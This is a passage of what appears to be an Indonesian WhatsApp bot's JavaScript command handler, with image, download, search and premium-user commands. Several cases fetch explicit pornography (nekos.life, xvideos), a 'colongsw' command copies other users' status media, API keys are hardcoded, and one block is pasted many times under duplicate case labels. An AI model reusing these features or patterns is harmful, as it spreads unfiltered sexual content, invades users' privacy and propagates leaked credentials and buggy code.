          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "kitsune":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "pussy":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "wallpaper":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "neko2":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "baka":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "slap":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "poke":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "keta":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case  'awoo':
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case  'blowjob':
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case  'hentai': 
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case  'megumin2':
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./nsfwdoge.jpg')})
break
case  'megumin':
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case 'neko':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
               if (!isRegistered) return reply (mess.banned)
               reply(mess.wait)
                buffer = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/neko`)
                const bbc = await itsmevall.prepareMessage(from, buffer, MessageType.image)

            const button = [{buttonId:`${prefix}neko`,buttonText: {displayText: 'Next️'}, type: 1}]

            const ButonMessages = {

            contentText: `_© By Alya✓Chan_`,

            buttons: button,

            footerText: `Klik Next Untuk Melanjutkan`,

            headerType: 4,

            imageMessage: bbc.message.imageMessage

            }

            await itsmevall.sendMessage(from, ButonMessages, MessageType.buttonsMessage, {quoted :mek})
            limitAdd(sender, limit)
                break
case  'trapnime':
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
//Done
				case 'nuliskiri':
				if (isBanned) return reply(mess.ban)
               if (args.length < 1) return reply('Yang mau di tulis apaan?')
               teks = args.join(' ')
               reply(mess.wait)
               nulis = encodeURIComponent(teks)
               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               if (res.data.error) return reply(res.data.error)
               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               itsmevall.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
               return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
               break
						case 'nuliskanan':
						if (isBanned) return reply(mess.ban)
               if (args.length < 1) return fakegroup('Yang mau di tulis apaan?')
               teks = args.join(' ')
               reply(mess.wait)
               nulis = encodeURIComponent(teks)
               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               if (res.data.error) return reply(res.data.error)
               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               itsmevall.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
               return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
               break                                           		
                                  case 'ytmgp4':
                                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                                  if (isBanned) return reply(mess.ban)
                                  if (!isPremium && !mek.key.fromMe) return reply(mess.prem)
                                  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
            if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3* _Url YouTube_`)
			if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link tidak valid!')
			var mulaikah = args.join(' ')
			reply(mess.wait)
			xa.Youtube(mulaikah).then(async (data) => {
                    let txt = `*----「 YOUTUBE VIDEO 」----*\n\n`
                    txt += `*• Quality :* ${data.medias[1].quality}\n`
                    txt += `*• Type :* ${data.medias[1].extension}\n`
                    txt += `*• Size :* ${data.medias[1].formattedSize}\n`
                    txt += `*• Url Source :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar kak, sedang proses pengiriman...*`
                    sendFileFromUrl(from, data.thumbnail, txt, mek)
                    sendFileFromUrl(from, data.medias[1].url, lang.ok(), mek)
                    }).catch((err) => {
                    reply('Link Nya erorr Tot Ngentot')
                })
        limitAdd(sender, limit)
        break
         case 'ytmp5':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!isPremium && !isOwner && !mek.key.fromMe) return reply(mess.prem)
if (isBanned) return reply(mess.ban)
if(!isUrl(args[0]) && !args[0].includes('youtube.com')) return reply('Link tidak valid!')
Url = args.join(' ')
anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/ytmp4?url=${Url}&apikey=${dhakey}`)
ytmp4 = await getBuffer(anu.result.url)
reply(`_*document sedang diproses, silahkan tunggu beberapa saat lagi*_`)
itsmevall.sendMessage(from, ytmp4, MessageType.document, {mimetype: 'audio/mp4',filename: `${anu.result.title}`,quoted: mek})
limitAdd(sender, limit)
break
               case "pubglogo":
       
				if (args.length < 1) return reply(`Where is the text?\n*Example ${prefix}pubglogo Xhen|Bot`)
				reply(mess.wait)
     ct = body.slice(9)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/game?text=${memek1}&text2=${memek2}&theme=pubg&apikey=beta`)
     buffer = await getBuffer(anu.result.url)
     itsmevall.sendMessage(from, buffer, image, {quoted: mek, caption: 'Here'})
     break
     case 'addprem':  
					if (!isOwner && !mek.key.fromMe) return reply('Only Owner')    
					adprem = `${args[0].replace('@','')}@s.whatsapp.net`
					prem.push(adprem)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`BERHASIL MENAMBAHKAN USER PREMIUM`)
					break				
		case 'dellprem':  
					
					if (!isOwner && !mek.key.fromMe) return reply('Only Owner')    
					delp = body.slice(10)
					prem.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`Berhasil Menghapus wa.me/${delp} Dari Daftar Premium`)
					break
		case 'listprem':
		case 'premlist'://By M4N1K
					teks = '*List Premium:*\n\n'
					for (let manikgans of prem) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${prem.length}*`
					itsmevall.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": prem } })
					break
        case "foliokiri":
case 'foliokanan':
if (isBanned) return reply(mess.ban)
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'Created By ZyyXtrime', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @_𝙞𝙩𝙨𝙢𝙚𝙫𝙖𝙡𝙡 ☹︎`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'xs':
if (isBanned) return reply(mess.ban)
if (!c) return reply('Nyari Apa?')
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${c}&apikey=${HunterApi}`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xvideo [link xvid] = Video`
itsmevall.sendMessage(from, anu, text, {quoted: mek})
break
case 'xvideo':
case 'xv':
if (isBanned) return reply(mess.ban)
if (!c) return grupinv('Linknya?')
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
itsmevall.sendMessage(from, vid, video, {quoted: mek})
break
case 'listnulis':
  reply(`Example ${prefix}nulis tes
  🌹 ${prefix}nulis rival
  🌹 ${prefix}foliokanan rival
  🌹 ${prefix}foliokiri rival
  🌹 ${prefix}nuliskanan rival
  🌹 ${prefix}nuliskiri rival`)
  break
case 'foliokiri':
if (!c) return reply(+'Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'Created By ZyyXtrime', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @_𝙞𝙩𝙨𝙢𝙚𝙫𝙖𝙡𝙡 ☹︎`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'nsfw':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
	        if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return grupinv(`untuk mengaktifkan ketik : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('Sudah Aktif Kak')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses mengaktifkan fitur nsfw')
						itsmevall.sendMessage(from, `Bebas Nyari Hentai 🗿`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Sudah Mati Kak')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses menonaktifkan fitur nsfw')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					limitAdd(sender, limit)
					break          
                    case 'text3d2':
                    if (isBanned) return reply(mess.ban)
            if (!isRegistered) return reply (mess.banned)
                if (args.length == 0) return reply(`Example: ${prefix + command} BotIndo`)
                    txt = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer(`https://api.zeks.me/api/text3d?apikey=${zekskey}&text=${txt}`)
                    itsmevall.sendMessage(from, buffer, image, { quoted: mek, caption: mess.success})
                    break
                    case 'ninjalogo':
                    if (isBanned) return reply(mess.ban)
			if (!isRegistered) return reply(mess.banned)
					var gh = body.slice(11)
					var gli = gh.split("&")[0];
					var tch = gh.split("&")[1];
					if (args.length < 1) return reply(`Example: ${prefix + command} Bot&Indo`)
					reply(mess.wait)
					buffer = await getBuffer(`https://ogata-api.herokuapp.com/api/textpro/ninjalogo?text1=${gli}&text2=${tch}&apikey=KFrfhVC4`)
					itsmevall.sendMessage(from, buffer, image, {quoted: mek, caption: mess.success})
					break                   					
case 'detikvn':
if (isBanned) return reply(mess.ban)
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await itsmevall.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						itsmevall.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:fvn})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				if (isBanned) return reply(mess.ban)
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await itsmevall.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						itsmevall.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: fvid})
						fs.unlinkSync(median)
				break
      case "colongsw": //arif
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await itsmevall.downloadAndSaveMediaMessage(ger);
          itsmevall.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await itsmevall.downloadAndSaveMediaMessage(ger);
          itsmevall.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;

      case "caripesan":
      if (isBanned) return reply(mess.ban)
        if (!q) return reply("pesannya apa bang?");
        let v = await itsmevall.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await itsmevall.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
         } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;      
      case 'otaku':
      if (isBanned) return reply(mess.ban)
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            itsmevall.sendMessage(from,ram,image,{quoted:dep,caption:rem})
            break
      case "komiku":
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
        if (!q) return reply(`gambar apa?\n${prefix}chara itsmevall`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await itsmevall.sendMessage(from, li, image, { quoted: mek });
        break;
      case 'pinterest':
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        if (!q) return reply("gambar apa?");
        if (args.length < 1) return reply(`Kirim perintah *${prefix}pinterest query`)
        reply(mess.wait)
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
buttons = [{buttonId: `pinterest ${q}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(di, "imageMessage", { thumbnail: di, })).imageMessage
              buttonsMessage = {footerText:'Created By ZyyXtrime', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @spnx.fauzi`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
        break;
      case "playstore":
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "❉─────────────────────❉\n";
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        break;
        case 'shopee':
               try {
               if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
               query = args.join(" ")
               reply(mess.wait)
               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${zekskey}&q=${query}`)
               get_data = get_data.data
               teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE* 
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_data.length; i++) {
teks += `\`\`\`🦈 Nama : ${get_data[i].name}\`\`\`
\`\`\`🦈 Harga : ${get_data[i].harga}\`\`\`
\`\`\`🦈 Terjual : ${get_data[i].terjual}\`\`\`
